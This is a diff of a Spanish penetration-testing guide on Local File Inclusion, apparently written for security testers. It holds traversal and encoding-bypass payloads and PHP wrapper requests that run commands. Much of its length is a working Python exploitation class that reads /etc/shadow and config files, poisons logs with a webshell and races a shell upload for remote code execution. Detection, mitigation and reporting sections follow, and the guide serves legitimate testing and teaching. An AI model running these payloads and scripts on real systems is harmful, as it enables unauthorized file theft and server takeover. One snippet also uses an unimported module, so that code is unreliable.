@@ -1,187 +1,842 @@
-# ¿Qué es Local File Disclosure (LFD)?
+# Inclusión Local de Archivos (LFI)
 
-El Local File Disclosure (LFD), o Divulgación Local de Archivos, es una vulnerabilidad que permite a un atacante leer el contenido de archivos arbitrarios en el sistema de ficheros del servidor donde está alojada la aplicación web. Estos archivos pueden contener información sensible como código fuente de la aplicación, credenciales de configuración, claves privadas, datos de usuarios, o archivos del sistema operativo.
+## Resumen
 
-La causa raíz suele ser que la aplicación utiliza input proporcionado por el usuario para construir la ruta a un archivo que luego lee o incluye, sin validar o sanitizar adecuadamente dicho input.
+La vulnerabilidad LFI permite a atacantes leer archivos arbitrarios del sistema de ficheros del servidor mediante manipulación de parámetros que referencian archivos. La aplicación utiliza input del usuario para construir rutas sin validación adecuada, exponiendo código fuente, credenciales y datos sensibles. Aplica cuando endpoints incluyen o procesan archivos basándose en entrada controlada por el usuario sin sanitización apropiada.[^3]
 
-### Directory Traversal (Path Traversal): El Mecanismo Común
+## Contexto
 
-El Directory Traversal, también conocido como "Path Traversal" o "Dot Dot Slash (`../`) Attack", es la técnica más común para lograr un LFD. Consiste en manipular la entrada de usuario que especifica un archivo para salir del directorio web raíz o de un directorio de trabajo esperado, y acceder a otros directorios y archivos en el sistema de ficheros del servidor.
+Las pruebas requieren navegador con herramientas de desarrollo, proxy como Burp Suite para manipular parámetros, y conocimiento de estructuras de directorios Linux/Windows. Los entornos modernos incluyen aplicaciones PHP con wrappers habilitados, servidores con logs accesibles y sistemas con configuraciones inseguras. Las técnicas avanzadas involucran condiciones de carrera para escalada a RCE y bypass de validaciones mediante encoding.[^7]
 
-- `.` : Representa el directorio actual.
-- `..`: Representa el directorio padre (subir un nivel en la jerarquía de directorios).
+## Metodología
 
-**Ejemplo Básico:** Una aplicación web carga imágenes usando un parámetro en la URL: `https://sitio-vulnerable.com/ver_imagen.php?archivo=gato_lindo.jpg`
+### Identificación de Puntos de Entrada Vulnerables
 
-El código del servidor podría ser algo así (PHP):
+1. **Mapear parámetros de archivo**
+   - URLs con referencias: `file=`, `page=`, `include=`, `template=`
+   - Parámetros de descarga: `download=`, `doc=`, `pdf=`
+   - Campos de configuración: `config=`, `lang=`, `style=`
+   - APIs que procesan rutas: `/api/files/{path}`
+2. **Análisis de estructura de aplicación**[^8]
+   - Identificar directorio web root (`/var/www/html`, `C:\inetpub\wwwroot`)
+   - Mapear estructura de archivos sensibles
+   - Detectar tecnología backend (PHP, Java, .NET)
+   - Verificar permisos de proceso web
+3. **Testeo de traversal básico**[^9]
+   - Probar secuencias `../` para Linux/Unix
+   - Usar `..\\` para sistemas Windows
+   - Calcular niveles necesarios mediante errores
+   - Verificar acceso a archivos conocidos (`/etc/passwd`, `C:\Windows\win.ini`)
+
+### Checklist de Verificación
+
+- [ ]  Identificar parámetros que referencien archivos o rutas
+- [ ]  Testear directory traversal con `../` y `..\\`
+- [ ]  Probar bypass de filtros mediante encoding
+- [ ]  Verificar escalada mediante PHP wrappers[^4]
+- [ ]  Evaluar log poisoning para RCE[^11]
+- [ ]  Confirmar acceso a archivos sensibles del sistema
+
+## Pruebas Manuales
+
+### Configuración Inicial
+
+Usar Burp Suite para interceptar requests con parámetros de archivo. Analizar respuestas y errores para determinar estructura del sistema.
+
+### Casos de Prueba Básicos
+
+**Caso 1: Directory Traversal simple**
+
+```http
+# Request normal
+GET /download.php?file=documento.pdf HTTP/1.1
+Host: victima.com
+
+# Traversal básico Linux
+GET /download.php?file=../../../../etc/passwd HTTP/1.1
+Host: victima.com
+
+# Traversal básico Windows  
+GET /download.php?file=..\..\..\..\Windows\win.ini HTTP/1.1
+Host: victima.com
+```
+
+**Caso 2: Bypass de extensión forzada**[^4]
+
+```http
+# Si aplicación añade .php automáticamente
+GET /include.php?page=../../../../etc/passwd%00 HTTP/1.1
+Host: victima.com
+
+# Null byte para truncar extensión
+GET /view.php?template=../../config/database%00.php HTTP/1.1
+Host: victima.com
+```
+
+### Técnicas de Bypass Avanzadas
+
+**Encoding múltiple:**[^12]
+
+```http
+# URL encoding simple
+file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+# Doble encoding
+file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+
+# Unicode overlong
+file=%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
+```
+
+**Bypass de filtros recursivos:**
+
+```http
+# Si filtro elimina ../
+file=....//....//....//etc/passwd
+
+# Si filtro no es recursivo
+file=..././..././..././etc/passwd
+```
+
+### PHP Wrappers para Escalada[^4]
+
+**php://filter para lectura:**
+
+```http
+GET /include.php?page=php://filter/convert.base64-encode/resource=config.php HTTP/1.1
+Host: victima.com
+```
+
+**php://input para RCE:**
+
+```http
+POST /include.php?page=php://input HTTP/1.1
+Host: victima.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+
+<?php system($_GET['cmd']); ?>
+```
+
+### Evidencias Mínimas
+
+- Screenshots de archivos sensibles accedidos (`/etc/passwd`, logs)
+- Contenido de archivos de configuración con credenciales
+- Código fuente de aplicación revelando lógica interna
+- Confirmación de RCE mediante wrappers o log poisoning
+
+## PoC
+
+### Manual: Lectura de Archivo Sensible
+
+**Objetivo:** Demostrar acceso no autorizado a archivos del sistema
+
+**Pasos:**
+
+1. Identificar parámetro vulnerable: `?file=` en victima.com
+2. Probar traversal básico: `?file=../../../../etc/passwd`
+3. Analizar respuesta para confirmar acceso exitoso
+4. Documentar contenido de archivo accedido
+5. Intentar acceso a archivos de configuración críticos
+
+**Resultado Esperado:** Lectura exitosa de `/etc/passwd` o archivos similares
+
+### Manual: Log Poisoning para RCE
+
+**Objetivo:** Escalar LFI a ejecución remota de código
+
+**Pasos:**
+
+1. Confirmar LFI puede acceder logs: `?file=/var/log/apache2/access.log`
+2. Envenenar logs con código PHP malicioso via User-Agent
+3. Incluir log envenenado mediante LFI
+4. Ejecutar comandos remotos y confirmar RCE
+
+### Automatizada: Script de Detección y Explotación
+
+```python
+import requests
+import base64
+import threading
+import time
+from urllib.parse import urlencode, quote
+import concurrent.futures
+
+class LFIExploiter:
+    """
+    Detector y explotador automatizado de vulnerabilidades LFI
+    """
+  
+    def __init__(self, base_url, vulnerable_param):
+        self.base_url = base_url
+        self.param = vulnerable_param
+        self.session = requests.Session()
+  
+        # Payloads de prueba comunes
+        self.linux_files = [
+            '/etc/passwd',
+            '/etc/shadow', 
+            '/etc/hosts',
+            '/proc/version',
+            '/proc/self/environ',
+            '/var/log/apache2/access.log',
+            '/var/log/apache2/error.log',
+            '/var/www/html/config.php'
+        ]
+  
+        self.windows_files = [
+            'C:\\Windows\\win.ini',
+            'C:\\Windows\\system32\\drivers\\etc\\hosts',
+            'C:\\boot.ini',
+            'C:\\inetpub\\wwwroot\\web.config'
+        ]
+  
+        # Técnicas de bypass
+        self.traversal_payloads = [
+            '../' * 6,
+            '..\\' * 6,
+            '%2e%2e%2f' * 6,
+            '%252e%252e%252f' * 6,
+            '....//....//....//....//....//..../',
+            '%c0%ae%c0%ae%c0%af' * 6
+        ]
+  
+    def test_basic_lfi(self, target_files):
+        """
+        Prueba LFI básico con archivos objetivo
+        """
+        vulnerable_files = []
+  
+        for target_file in target_files:
+            for traversal in self.traversal_payloads:
+                payload = traversal + target_file.lstrip('/')
+          
+                try:
+                    response = self.session.get(
+                        self.base_url,
+                        params={self.param: payload},
+                        timeout=10
+                    )
+              
+                    # Detectar lectura exitosa
+                    if self._is_file_read_successful(response, target_file):
+                        vulnerable_files.append({
+                            'file': target_file,
+                            'payload': payload,
+                            'content_preview': response.text[:500],
+                            'method': 'basic_traversal'
+                        })
+                        print(f"[+] LFI confirmado: {target_file} con payload {payload}")
+                        break
+                  
+                except requests.RequestException as e:
+                    continue
+  
+        return vulnerable_files
+  
+    def test_php_wrappers(self):
+        """
+        Prueba wrappers PHP para lectura y RCE
+        """
+        vulnerable_wrappers = []
+  
+        # Wrapper php://filter
+        filter_payloads = [
+            'php://filter/convert.base64-encode/resource=index.php',
+            'php://filter/read=string.rot13/resource=config.php',
+            'php://filter/resource=/etc/passwd'
+        ]
+  
+        for payload in filter_payloads:
+            try:
+                response = self.session.get(
+                    self.base_url,
+                    params={self.param: payload},
+                    timeout=10
+                )
+          
+                if response.status_code == 200 and len(response.text) > 100:
+                    # Intentar decodificar base64 si aplica
+                    if 'base64-encode' in payload:
+                        try:
+                            decoded = base64.b64decode(response.text).decode('utf-8')
+                            if '<?php' in decoded:
+                                vulnerable_wrappers.append({
+                                    'wrapper': payload,
+                                    'type': 'php_filter_source_disclosure',
+                                    'decoded_content': decoded[:500]
+                                })
+                                print(f"[+] PHP Filter funciona: {payload}")
+                        except:
+                            pass
+                    else:
+                        vulnerable_wrappers.append({
+                            'wrapper': payload,
+                            'type': 'php_filter_read',
+                            'content': response.text[:500]
+                        })
+                  
+            except requests.RequestException:
+                continue
+  
+        # Wrapper php://input para RCE
+        if self._test_php_input_rce():
+            vulnerable_wrappers.append({
+                'wrapper': 'php://input',
+                'type': 'rce_via_input',
+                'description': 'RCE confirmado via php://input'
+            })
+  
+        return vulnerable_wrappers
+  
+    def test_log_poisoning(self, log_files=['/var/log/apache2/access.log']):
+        """
+        Intenta log poisoning para RCE
+        """
+        poisoning_results = []
+  
+        for log_file in log_files:
+            # Primero verificar acceso al log
+            if not self._can_access_file(log_file):
+                continue
+          
+            # Envenenar log con código PHP
+            poison_payload = '<?php system($_GET["cmd"]); ?>'
+      
+            try:
+                # Envenenar via User-Agent
+                self.session.get(
+                    self.base_url,
+                    headers={'User-Agent': poison_payload},
+                    timeout=5
+                )
+          
+                # Intentar ejecutar comando via log envenenado
+                cmd_payload = '../' * 6 + log_file.lstrip('/') + '&cmd=id'
+          
+                response = self.session.get(
+                    self.base_url,
+                    params={self.param: cmd_payload},
+                    timeout=10
+                )
+          
+                if 'uid=' in response.text and 'gid=' in response.text:
+                    poisoning_results.append({
+                        'log_file': log_file,
+                        'method': 'user_agent_poisoning',
+                        'rce_confirmed': True,
+                        'command_output': response.text[:300]
+                    })
+                    print(f"[+] Log Poisoning RCE exitoso en {log_file}")
+              
+            except requests.RequestException:
+                continue
+          
+        return poisoning_results
+  
+    def race_condition_exploit(self, upload_endpoint=None):
+        """
+        Explota condiciones de carrera para RCE
+        """
+        if not upload_endpoint:
+            return []
+      
+        race_results = []
+  
+        def upload_shell():
+            # Subir shell PHP con bytes mágicos si requerido
+            shell_content = b'fakeapp<?php system($_GET["cmd"]); ?>'
+            files = {'file': ('shell.php', shell_content, 'text/plain')}
+      
+            try:
+                response = self.session.post(upload_endpoint, files=files, timeout=5)
+                return response.status_code == 200
+            except:
+                return False
+  
+        def access_shell():
+            # Intentar acceder al shell subido
+            try:
+                response = self.session.get(
+                    f"{self.base_url}?{self.param}=shell.php&cmd=id",
+                    timeout=2
+                )
+                return 'uid=' in response.text
+            except:
+                return False
+  
+        # Ejecutar race condition con hilos
+        for attempt in range(50):
+            with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
+                upload_future = executor.submit(upload_shell)
+                access_future = executor.submit(access_shell)
+          
+                upload_result = upload_future.result()
+                access_result = access_future.result()
+          
+                if upload_result and access_result:
+                    race_results.append({
+                        'method': 'race_condition_upload',
+                        'attempt': attempt,
+                        'rce_confirmed': True
+                    })
+                    print(f"[+] Race condition RCE exitoso en intento {attempt}")
+                    break
+              
+            time.sleep(0.1)
+  
+        return race_results
+  
+    def _is_file_read_successful(self, response, target_file):
+        """
+        Determina si la lectura del archivo fue exitosa
+        """
+        if response.status_code != 200:
+            return False
+      
+        content = response.text.lower()
+  
+        # Indicadores por tipo de archivo
+        if 'passwd' in target_file:
+            return 'root:' in content or 'bin:' in content or 'daemon:' in content
+        elif 'win.ini' in target_file:
+            return '[fonts]' in content or '[extensions]' in content
+        elif 'hosts' in target_file:
+            return 'localhost' in content or '127.0.0.1' in content
+        elif 'config' in target_file:
+            return 'password' in content or 'database' in content or 'key' in content
+      
+        return len(response.text) > 50 and 'error' not in content
+  
+    def _can_access_file(self, file_path):
+        """
+        Verifica si se puede acceder a un archivo
+        """
+        payload = '../' * 6 + file_path.lstrip('/')
+  
+        try:
+            response = self.session.get(
+                self.base_url,
+                params={self.param: payload},
+                timeout=5
+            )
+            return response.status_code == 200 and len(response.text) > 50
+        except:
+            return False
+  
+    def _test_php_input_rce(self):
+        """
+        Prueba RCE via php://input
+        """
+        try:
+            response = self.session.post(
+                self.base_url,
+                params={self.param: 'php://input'},
+                data='<?php echo "LFI_RCE_TEST"; ?>',
+                headers={'Content-Type': 'application/x-www-form-urlencoded'},
+                timeout=10
+            )
+            return 'LFI_RCE_TEST' in response.text
+        except:
+            return False
+  
+    def comprehensive_scan(self):
+        """
+        Escaneo completo de LFI con todas las técnicas
+        """
+        print("[*] Iniciando escaneo comprehensivo de LFI...")
+  
+        results = {
+            'basic_lfi': [],
+            'php_wrappers': [],
+            'log_poisoning': [],
+            'race_conditions': []
+        }
+  
+        # Test LFI básico
+        print("[*] Probando LFI básico en archivos Linux...")
+        results['basic_lfi'].extend(self.test_basic_lfi(self.linux_files))
+  
+        print("[*] Probando LFI básico en archivos Windows...")  
+        results['basic_lfi'].extend(self.test_basic_lfi(self.windows_files))
+  
+        # Test PHP wrappers
+        print("[*] Probando PHP wrappers...")
+        results['php_wrappers'] = self.test_php_wrappers()
+  
+        # Test log poisoning
+        print("[*] Probando log poisoning...")
+        results['log_poisoning'] = self.test_log_poisoning()
+  
+        # Test race conditions (requiere endpoint de subida)
+        # results['race_conditions'] = self.race_condition_exploit('/upload.php')
+  
+        total_vulns = sum(len(v) if isinstance(v, list) else 1 if v else 0 for v in results.values())
+        print(f"[*] Escaneo completado. Encontradas {total_vulns} vulnerabilidades LFI")
+  
+        return results
+
+# Uso del explotador
+if __name__ == "__main__":
+    # Configurar objetivo
+    target_url = "https://victima.com/vulnerable.php"
+    param_name = "file"
+  
+    exploiter = LFIExploiter(target_url, param_name)
+    vulnerabilities = exploiter.comprehensive_scan()
+  
+    # Generar reporte
+    import json
+    with open('lfi_report.json', 'w') as f:
+        json.dump(vulnerabilities, f, indent=2)
+  
+    print("[*] Reporte guardado en lfi_report.json")
+```
+
+## Explotación/Automatización
+
+### Técnicas de Bypass WAF[^14]
+
+**Case variation:**
+
+```http
+# Alternar mayúsculas/minúsculas
+file=..%2F..%2F..%2FetC%2FpaSSwd
+
+# Mezclar encoding
+file=%2E%2E%2f%2E%2E%2f%2E%2E%2fetc%2fpasswd
+```
+
+**Fragmentación de payloads:**
+
+```python
+# Dividir payload en múltiples parámetros
+payload1 = "../../../"
+payload2 = "etc/passwd"
+url = f"?part1={payload1}&part2={payload2}"
+```
+
+### Condiciones de Carrera[^15]
+
+Explotar ventanas temporales entre subida y validación:
+
+```python
+import threading
+import requests
+
+def race_lfi_rce(upload_url, lfi_url):
+    def upload_shell():
+        files = {'file': ('shell.php', '<?php system($_GET["c"]); ?>', 'text/plain')}
+        requests.post(upload_url, files=files)
+  
+    def execute_shell():
+        time.sleep(0.01)  # Timing crítico
+        response = requests.get(f"{lfi_url}?file=uploads/shell.php&c=id")
+        return 'uid=' in response.text
+  
+    # Ejecutar concurrentemente
+    t1 = threading.Thread(target=upload_shell)
+    t2 = threading.Thread(target=execute_shell) 
+  
+    t1.start()
+    t2.start()
+  
+    return execute_shell()
+```
+
+### Herramientas Automatizadas[^17]
+
+**LFISuite:**
+
+- Detección automatizada con múltiples payloads
+- Bypass de filtros mediante encoding
+- Escalada automática a RCE
+
+**ffuf con wordlists específicas:**[^18]
+
+```bash
+ffuf -u "https://victima.com/app.php?FUZZ=../../../etc/passwd" \
+     -w lfi_payloads.txt \
+     -fw 485  # Filtrar respuestas con 485 palabras
+```
+
+## Impacto
+
+### Escenario Real
+
+Un atacante explota LFI en aplicación web para leer `/etc/passwd` y archivos de configuración, obteniendo credenciales de base de datos. Mediante log poisoning escala a RCE y compromete completamente el servidor. La fuga incluye código fuente de aplicación revelando otras vulnerabilidades críticas.[^1]
+
+### Mapeo de Seguridad
+
+- **OWASP:** A03:2021 - Injection, A05:2021 - Security Misconfiguration
+- **CWE:** CWE-22 - Path Traversal, CWE-98 - PHP File Inclusion
+- **CVSS v3.1:** Rango típico 6.0-9.0 (Medio-Crítico)[^20]
+
+### Severidad CVSS
+
+Para LFI con lectura de archivos sensibles:
+
+```
+CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+Puntuación Base: 7.5
+```
+
+Para escalada LFI a RCE:
+
+```
+CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+Puntuación Base: 9.8
+```
+
+## Detección
+
+### Logs de Aplicación
+
+Implementar logging de:
+
+- Requests con secuencias `../` o `..\\` en parámetros
+- Accesos a archivos fuera del directorio web esperado
+- Patrones de directory traversal en URLs
+- Uso de wrappers PHP sospechosos (`php://`, `data://`)[^4]
+
+### WAF/Proxy[^21]
+
+Configurar reglas para detectar:
+
+- Sequences de traversal comunes y sus encodings
+- Acceso a archivos sensibles conocidos (`/etc/passwd`, logs)
+- Wrappers PHP maliciosos en parámetros
+- Patrones de log poisoning (código PHP en User-Agent)
+
+### Monitoreo de Sistema
+
+Implementar:
+
+- Alertas por acceso anómalo a archivos críticos
+- Monitoreo de procesos con comportamiento sospechoso
+- Detección de modificaciones en logs del sistema
+- Análisis de tráfico con patrones LFI[^21]
+
+## Mitigación
+
+### Fix Principal
+
+Implementar validación estricta de entrada:
 
 ```php
 <?php
-  $base_path = "/var/www/html/imagenes/";
-  $file_to_load = $_GET['archivo'];
-  include($base_path . $file_to_load); 
-  // ¡PELIGRO! Concatena input directamente
+// Configuración segura contra LFI
+function secure_file_include($user_input) {
+    // Whitelist de archivos permitidos
+    $allowed_files = [
+        'home' => 'templates/home.php',
+        'about' => 'templates/about.php', 
+        'contact' => 'templates/contact.php'
+    ];
+  
+    // Validar contra whitelist
+    if (!array_key_exists($user_input, $allowed_files)) {
+        throw new Exception("Archivo no permitido");
+    }
+  
+    // Usar ruta canónica y verificar
+    $file_path = realpath($allowed_files[$user_input]);
+    $base_path = realpath(__DIR__ . '/templates/');
+  
+    // Verificar que esté dentro del directorio base
+    if (strpos($file_path, $base_path) !== 0) {
+        throw new Exception("Acceso denegado");  
+    }
+  
+    return $file_path;
+}
+
+// Uso seguro
+try {
+    $safe_file = secure_file_include($_GET['page']);
+    include($safe_file);
+} catch (Exception $e) {
+    echo "Error: Página no encontrada";
+}
 ?>
 ```
 
-Un atacante puede intentar acceder a archivos fuera del directorio `/var/www/html/imagenes/`:
+### Controles Adicionales
 
-**Ataque (Linux):** `https://sitio-vulnerable.com/ver_imagen.php?archivo=../../../../../../etc/passwd`
+1. **Configuración de PHP segura**[^5]
+   - Deshabilitar `allow_url_include` y `allow_url_fopen`
+   - Remover wrappers peligrosos (`expect://`, `php://input`)
+   - Configurar `open_basedir` para restriccir acceso
+2. **Principio de menor privilegio**[^8]
+   - Ejecutar servidor web con usuario de bajos privilegios
+   - Limitar acceso de lectura solo a directorios necesarios
+   - Usar chroot jail cuando sea posible
+3. **Hardening de sistema**
+   - Proteger archivos sensibles con permisos restrictivos
+   - Rotar y asegurar logs del sistema
+   - Implementar AppArmor/SELinux para restricciones adicionales
 
-- En Linux, las webs suelen estar en `/var/www/html/` (o similar).
-- Usando `../` repetidamente, el atacante intenta subir en la jerarquía de directorios hasta la raíz (`/`) y luego acceder a `/etc/passwd`.
-- Leer `/etc/passwd` (que contiene la lista de usuarios del sistema) es un PoC (Proof of Concept) común para LFD en Linux. No contiene contraseñas (esas están en `/etc/shadow`, que normalmente requiere privilegios de root para ser leído), pero confirma la vulnerabilidad.
+### Pruebas Post-Fix
 
-**Ataque (Windows):** `https://sitio-vulnerable.com/ver_imagen.php?archivo=..\..\..\..\..\boot.ini` (En Windows se usa `..\` en lugar de `../`)
+- Verificar que solo archivos whitelistados son accesibles
+- Confirmar que traversal con `../` es bloqueado efectivamente
+- Testear que wrappers PHP no funcionan en parámetros
+- Validar que logs no pueden ser envenenados exitosamente
 
-### Archivos Sensibles Comunes a Buscar
+## Errores Comunes
 
-**Linux:**
+### Falsos Positivos[^21]
 
-- `/etc/passwd`: Lista de usuarios del sistema.
-- `/etc/shadow`: Hashes de contraseñas (requiere privilegios para leer).
-- `/etc/hosts`: Mapeo de hostnames a IPs.
-- `/etc/resolv.conf`: Configuración de DNS.
-- `/etc/issue` o `/etc/motd`: Mensajes del sistema.
-- `/proc/version`: Versión del kernel.
-- `/proc/sched_debug`: Información del planificador (puede revelar procesos).
-- `/proc/self/environ`: Variables de entorno del proceso actual (puede ser útil para RCE).
-- `/proc/self/cmdline`: Argumentos con los que se ejecutó el proceso.
-- `/proc/mounts`: Sistemas de ficheros montados.
-- `/var/log/apache2/access.log`, `/var/log/apache2/error.log`: Logs de Apache.
-- `/var/log/auth.log`: Logs de autenticación.
-- Código fuente de la aplicación: `/var/www/html/config.php`, `/opt/app/settings.py`, etc.
-- Claves SSH: `/home/usuario/.ssh/id_rsa`, `/root/.ssh/id_rsa`.
+- Confundir errores de aplicación con acceso exitoso a archivos
+- Reportar responses 200 sin confirmar contenido de archivo
+- Asumir LFI sin verificar lectura real de datos sensibles
+- No distinguir entre path traversal y file inclusion real[^9]
 
-**Windows:**
+### Límites de Testing
 
-- `C:\boot.ini`: Opciones de arranque (sistemas antiguos).
-- `C:\Windows\System32\drivers\etc\hosts`: Equivalente a `/etc/hosts`.
-- `C:\Windows\win.ini`: Configuración del sistema (sistemas antiguos).
-- `C:\Windows\system.ini`: Configuración del sistema (sistemas antiguos).
-- `C:\Windows\repair\sam`: Copia de seguridad del SAM (hashes de contraseñas, requiere privilegios).
-- `C:\inetpub\wwwroot\web.config`: Configuración de IIS.
-- Logs de IIS: `C:\inetpub\logs\LogFiles\W3SVC1\u_exYYMMDD.log`.
-- Código fuente: `C:\inetpub\wwwroot\config.asp`, `C:\App\settings.json`.
+- Aplicaciones con validación estricta de whitelist
+- Sistemas con `open_basedir` configurado correctamente
+- WAFs avanzados con detección de patrones LFI[^14]
+- Servidores hardened con permisos restrictivos
 
-### Técnicas de Bypass de Filtros y Restricciones
+## Reporte
 
-Las aplicaciones pueden intentar prevenir el Path Traversal mediante filtros.
+### Título
 
-1. **Bypass de Restricciones de Extensión (Sufijos Forzados):** A veces la aplicación añade una extensión esperada al final del input (e.g., `.jpg`, `.pdf`).
+"Inclusión Local de Archivos (LFI) - Acceso No Autorizado al Sistema de Ficheros"
 
-   - Input del atacante: `../../../../etc/passwd`
-   - Aplicación lo procesa como: `/var/www/html/imagenes/../../../../etc/passwd.jpg` (Esto fallaría).
+### Resumen Ejecutivo
 
-   **Técnicas de Bypass:**
+La aplicación permite inclusión no autorizada de archivos locales mediante manipulación de parámetros, exponiendo archivos sensibles del sistema y potencialmente escalando a ejecución remota de código.
 
-   - **Null Byte (`%00`):**
-     - Payload: `../../../../etc/passwd%00`
-     - Resultado en C/PHP (versiones antiguas): `/var/www/html/imagenes/../../../../etc/passwd\0.jpg`. El terminador nulo (`\0`) hace que el resto de la cadena (`.jpg`) se ignore.
-     - **Nota:** El null byte es menos efectivo en versiones modernas de PHP (>= 5.3.4) y otros lenguajes que manejan strings de forma más segura.
-   - **Uso de `?` (Query String):**
-     - Payload: `../../../../etc/passwd?`
-     - Resultado: `/var/www/html/imagenes/../../../../etc/passwd?.jpg`. Algunas funciones de acceso a ficheros interpretan `?` como el final de la ruta del archivo y el inicio de una query string, ignorando lo que sigue.
-   - **Uso de `#` (Fragmento URL):**
-     - Payload: `../../../../etc/passwd#`
-     - Menos probable que funcione server-side ya que los fragmentos suelen ser procesados solo por el cliente (navegador). Sin embargo, en algunos casos raros o con lógica personalizada, podría tener efecto.
-   - **Path Truncation (Longitud Excesiva):**
-     - Si la aplicación usa buffers de tamaño fijo, un nombre de archivo muy largo podría truncarse antes de que se añada el sufijo.
-   - **Incluir la Extensión Permitida en un Nombre de Directorio Falso:**
-     - Payload: `../../../../etc/passwd/.jpg`
-     - Si la aplicación solo verifica `endsWith(".jpg")` pero no normaliza la ruta, podría intentar leer `/etc/passwd/.jpg` como un archivo dentro de un directorio inexistente `.jpg` dentro de `/etc/passwd/`. Esto rara vez funciona para leer el archivo directamente, pero puede revelar información en mensajes de error.
-2. **Bypass de Filtros Anti-Traversal (Bloqueo de `../`):**
+### Pasos de Reproducción
 
-   - **Codificación URL (URL Encoding):**
-     - `.` -> `%2e`
-     - `/` -> `%2f` (para path traversal) o `%5c` (para `\` en Windows)
-     - `../` -> `%2e%2e%2f`
-     - `..\` -> `%2e%2e%5c`
-   - **Doble Codificación URL:**
-     - `%2e%2e%2f` -> `%252e%252e%252f` (el servidor decodifica una vez, el filtro no lo ve, luego la función de acceso a ficheros vuelve a decodificar o lo interpreta).
-   - **Codificaciones No Estándar / Overlong UTF-8:**
-     - `/` -> `%c0%af`, `%c1%9c`, etc.
-     - `\` -> `%c0%bc`, `%c1%9c`, etc.
-     - `../` -> `%2e%2e%c0%af` o `%2e%2e%c1%9c`
-   - **"Doble Traversal" o Variantes:**
-     - Si el filtro elimina la primera ocurrencia de `../` de forma no recursiva.
-     - `....//` -> (tras eliminar `../`) `../`
-     - `..././` -> (tras eliminar `../`) `./` (no útil) o `..%2F./` -> (tras eliminar `../`) `./`
-     - El ejemplo `....//` a menudo se interpreta como `../` por el sistema de archivos después de la normalización (e.g., `foo/....//bar` -> `foo/../bar` -> `bar`).
-     - Variaciones: `../../`, `..\/`, `..\.\`, `/%5C..`
-   - **Uso de Rutas Absolutas:**
-     - Si el filtro solo bloquea `../` pero la aplicación permite rutas absolutas si el input no empieza por un path esperado.
-     - Payload: `/etc/passwd` o `C:/Windows/win.ini`
-   - **Encapsulamiento o Wrappers:**
-     - En algunos casos, si la aplicación usa wrappers o protocolos especiales, se pueden encontrar bypasses específicos (e.g., `file:///etc/passwd`).
+1. Identificar parámetro vulnerable que referencia archivos
+2. Enviar payload de directory traversal: `?file=../../../../etc/passwd`
+3. Confirmar lectura exitosa de archivo del sistema
+4. Intentar escalada mediante PHP wrappers o log poisoning
+5. Demostrar acceso a archivos de configuración críticos
 
-**Ejemplo de Ataque Combinado (Corregido y Clarificado):** La petición original del usuario era: `GET http://cryptosite.com/download_earnings?u=%2e%20%2f%2e%20%2f%20%2e%2fetc%2fpasswd%00csv HTTP/1.1` Los `%20` (espacios) en la secuencia de traversal son incorrectos. Asumiendo que se quería añadir `.csv` y bypassarlo con null byte:
+### Evidencias
 
-`GET http://cryptosite.com/download_earnings?u=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00.csv HTTP/1.1`
+- Screenshots de `/etc/passwd` accedido exitosamente
+- Contenido de archivos de configuración con credenciales
+- Código fuente de aplicación revelado via php://filter
+- Logs de comandos ejecutados via log poisoning (si aplica)
 
-- `%2e%2e%2f` es `../` codificado.
-- `%00` es el null byte.
-- `.csv` es el sufijo que la aplicación podría estar añadiendo y que se intenta truncar con el null byte.
+### Mitigación Recomendada
 
-### Escalada de LFI a RCE (Remote Code Execution)
+Implementar validación estricta con whitelist de archivos permitidos, usar `realpath()` para canonicalización de rutas, deshabilitar wrappers PHP peligrosos y aplicar principio de menor privilegio al proceso del servidor web.
 
-Un LFD/LFI se vuelve mucho más crítico si se puede escalar a Ejecución Remota de Código. Esto depende mucho de la tecnología del servidor (especialmente PHP) y de lo que se pueda incluir/leer.
 
-1. **Wrappers de PHP:**
-   - **`php://filter`**: Permite leer archivos usando filtros de codificación (e.g., base64), lo que puede ayudar a exfiltrar binarios o evitar que el código PHP se ejecute si se incluye.
-     - `?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd`
-     - `?file=php://filter/read=string.rot13/resource=index.php` (para ofuscar ligeramente el código PHP y leerlo)
-   - **`php://input`**: Permite incluir el cuerpo de una petición POST. Si se puede incluir y el contenido es código PHP, se ejecutará.
-     - `?file=php://input` (y en el cuerpo del POST: `<?php system('id'); ?>`)
-   - **`data://` wrapper**: Permite incluir datos codificados directamente en la URL.
-     - `?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+` (payload `<?php system($_GET['cmd']); ?>` en base64) y luego `&cmd=id`.
-   - **`expect://` wrapper**: Si el módulo `expect` de PHP está cargado, permite ejecutar comandos.
-     - `?file=expect://id`
-2. **Envenenamiento de Logs (Log Poisoning):**
-   - Si un atacante puede escribir código PHP en un archivo de log que luego puede incluir vía LFI.
-   - **Logs de Apache:** Hacer una petición a Apache con código PHP en la URL o en el User-Agent.
-     - `GET /<?php system('id'); ?> HTTP/1.1` (esto se loguea).
-     - Luego incluir el log: `?file=../../../../var/log/apache2/access.log`
-   - **Logs de SSH (`/var/log/auth.log`):** Intentar loguear como un usuario `<?php system('id'); ?>@servidor_victima`.
-3. **Inclusión de `/proc/self/environ`:**
-   - Si el servidor web permite controlar variables de entorno (e.g., a través de la cabecera User-Agent si se usa como variable en algún CGI) y el LFI puede leer `/proc/self/environ`.
-   - El atacante inyecta código PHP en una variable de entorno y luego incluye `/proc/self/environ`.
-4. **Inclusión de Archivos de Sesión PHP:**
-   - Si la aplicación almacena datos controlados por el usuario en archivos de sesión PHP y el atacante conoce la ruta y el formato de estos archivos.
-   - El atacante guarda código PHP en su sesión, luego usa el LFI para incluir su propio archivo de sesión.
-5. **Vulnerabilidad de Subida de Archivos + LFI:**
-   - Si el atacante puede subir un archivo (e.g., una imagen) que contenga código PHP (a veces con extensión doble como `payload.php.jpg`), y luego usar el LFI para incluir ese archivo subido, el código PHP se ejecutará.
-
-### Metodología de Testeo Sistemática
-
